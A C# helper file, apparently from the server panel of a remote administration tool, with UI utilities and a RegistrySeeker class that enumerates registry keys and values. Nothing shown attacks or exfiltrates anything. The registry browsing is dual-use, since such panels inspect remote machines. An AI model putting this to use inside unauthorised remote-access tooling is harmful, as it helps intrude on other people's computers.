using Microsoft.VisualBasic;
using Microsoft.Win32;
using Server.Algorithm;
using Server.Handle_Packet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Helper
{
    public static class Methods
    {
        private const string Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        public static string BytesToString(long byteCount)
        {
            string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
            if (byteCount == 0)
                return "0" + suf[0];
            long bytes = Math.Abs(byteCount);
            int place = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)));
            double num = Math.Round(bytes / Math.Pow(1024, place), 1);
            return (Math.Sign(byteCount) * num).ToString() + suf[place];
        }

        public static async Task FadeIn(Form o, int interval = 80)
        {
            while (o.Opacity < 1.0)
            {
                await Task.Delay(interval);
                o.Opacity += 0.05;
            }
        }
        public static double DiffSeconds(DateTime startTime, DateTime endTime)
        {
            TimeSpan secondSpan = new TimeSpan(endTime.Ticks - startTime.Ticks);
            return Math.Abs(secondSpan.TotalSeconds);
        }
        public static Random Random = new Random();
        public static string GetRandomString(int length)
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(Alphabet[Random.Next(Alphabet.Length)]);

            return randomName.ToString();
        }

        private const int LVM_FIRST = 0x1000;
        private const int LVM_SETITEMSTATE = LVM_FIRST + 43;

        private const int WM_VSCROLL = 277;
        private static readonly IntPtr SB_PAGEBOTTOM = new IntPtr(7);

        public static int MakeWin32Long(short wLow, short wHigh)
        {
            return (int)wLow << 16 | (int)(short)wHigh;
        }

        public static void SetItemState(IntPtr handle, int itemIndex, int mask, int value)
        {
            NativeMethods.LVITEM lvItem = new NativeMethods.LVITEM
            {
                stateMask = mask,
                state = value
            };

            NativeMethods.SendMessageListViewItem(handle, LVM_SETITEMSTATE, new IntPtr(itemIndex), ref lvItem);
        }

        public static void ScrollToBottom(IntPtr handle)
        {
            NativeMethods.SendMessage(handle, WM_VSCROLL, SB_PAGEBOTTOM, IntPtr.Zero);
        }
    }




    public static class NativeMethods
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        internal struct LVITEM
        {
            public uint mask;
            public int iItem;
            public int iSubItem;
            public int state;
            public int stateMask;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pszText;
            public int cchTextMax;
            public int iImage;
            public IntPtr lParam;
            public int iIndent;
            public int iGroupId;
            public uint cColumns;
            public IntPtr puColumns;
            public IntPtr piColFmt;
            public int iGroup;
        };

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        internal static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessage")]
        internal static extern IntPtr SendMessageListViewItem(IntPtr hWnd, uint msg, IntPtr wParam, ref LVITEM lParam);

        [DllImport("user32.dll")]
        internal static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, int vk);

        [DllImport("user32.dll")]
        internal static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        [DllImport("uxtheme.dll", CharSet = CharSet.Unicode)]
        internal static extern int SetWindowTheme(IntPtr hWnd, string pszSubAppName, string pszSubIdList);
    }


    public class RegistrySeeker
    {

        [Serializable]
        public class RegSeekerMatch
        {
            public string Key { get; set; }

            public RegValueData[] Data { get; set; }

            public bool HasSubKeys { get; set; }

            public override string ToString()
            {
                return $"({Key}:{Data})";
            }
        }

        [Serializable]
        public class RegValueData
        {
            public string Name { get; set; }

            public RegistryValueKind Kind { get; set; }

            public byte[] Data { get; set; }
        }
        /// <summary>
        /// The list containing the matches found during the search.
        /// </summary>
        private readonly List<RegSeekerMatch> _matches;

        public RegSeekerMatch[] Matches => _matches?.ToArray();

        public RegistrySeeker()
        {
            _matches = new List<RegSeekerMatch>();
        }
        
        public void BeginSeeking(string rootKeyName)
        {
            if (!String.IsNullOrEmpty(rootKeyName))
            {
                using (RegistryKey root = GetRootKey(rootKeyName))
                {
                    //Check if this is a root key or not
                    if (root != null && root.Name != rootKeyName)
                    {
                        //Must get the subKey name by removing root and '\'
                        string subKeyName = rootKeyName.Substring(root.Name.Length + 1);
                        using (RegistryKey subroot = root.OpenReadonlySubKeySafe(subKeyName))
                        {
                            if (subroot != null)
                                Seek(subroot);
                        }
                    }
                    else
                    {
                        Seek(root);
                    }
                }
            }
            else
            {
                Seek(null);
            }
        }

        private void Seek(RegistryKey rootKey)
        {
            // Get root registrys
            if (rootKey == null)
            {
                foreach (RegistryKey key in GetRootKeys())
                    //Just need root key so process it
                    ProcessKey(key, key.Name);
            }
            else
            {
                //searching for subkeys to root key
                Search(rootKey);
            }
        }

        private void Search(RegistryKey rootKey)
        {
            foreach (string subKeyName in rootKey.GetSubKeyNames())
            {
                RegistryKey subKey = rootKey.OpenReadonlySubKeySafe(subKeyName);
                ProcessKey(subKey, subKeyName);
            }
        }

        private void ProcessKey(RegistryKey key, string keyName)
        {
            if (key != null)
            {
                List<RegValueData> values = new List<RegValueData>();

                foreach (string valueName in key.GetValueNames())
                {
                    RegistryValueKind valueType = key.GetValueKind(valueName);
                    object valueData = key.GetValue(valueName);
                    values.Add(RegistryKeyHelper.CreateRegValueData(valueName, valueType, valueData));
                }

                AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(values), key.SubKeyCount);
            }
            else
            {
                AddMatch(keyName, RegistryKeyHelper.GetDefaultValues(), 0);
            }
        }

        private void AddMatch(string key, RegValueData[] values, int subkeycount)
        {
            RegSeekerMatch match = new RegSeekerMatch { Key = key, Data = values, HasSubKeys = subkeycount > 0 };

            _matches.Add(match);
        }

        public static RegistryKey GetRootKey(string subkeyFullPath)
        {
            string[] path = subkeyFullPath.Split('\\');
            try
            {
                switch (path[0]) // <== root;
                {
                    case "HKEY_CLASSES_ROOT":
                        return RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64);
                    case "HKEY_CURRENT_USER":
                        return RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                    case "HKEY_LOCAL_MACHINE":
                        return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    case "HKEY_USERS":
                        return RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64);
                    case "HKEY_CURRENT_CONFIG":
                        return RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64);
                    default:
                        /* If none of the above then the key must be invalid */
                        throw new Exception("Invalid rootkey, could not be found.");
                }
            }
            catch (SystemException)
            {
                throw new Exception("Unable to open root registry key, you do not have the needed permissions.");
            }
            catch (Exception e)
            {
                throw e;
            }
        }

        public static List<RegistryKey> GetRootKeys()
        {
            List<RegistryKey> rootKeys = new List<RegistryKey>();
            try
            {
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64));
            }
            catch (SystemException)
            {
                throw new Exception("Could not open root registry keys, you may not have the needed permission");
            }
            catch (Exception e)
            {
                throw e;
            }

            return rootKeys;
        }
    }
}
